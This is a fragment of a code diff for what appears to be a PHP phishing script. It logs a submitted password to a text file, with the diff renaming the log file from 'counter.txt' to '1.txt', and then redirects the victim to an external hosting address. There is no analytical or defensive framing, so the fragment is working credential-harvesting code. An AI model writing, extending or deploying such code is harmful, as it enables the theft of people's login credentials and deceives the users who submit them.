@@ -6,7 +6,7 @@
   password: $password
      ";
    echo $output;
-   $fp = fopen('counter.txt', 'a');
+   $fp = fopen('1.txt', 'a');
 fwrite($fp, $output . PHP_EOL);
 fclose($fp);
  header( "Location: http://vps39144nl.hyperhost.name/index1.html" );
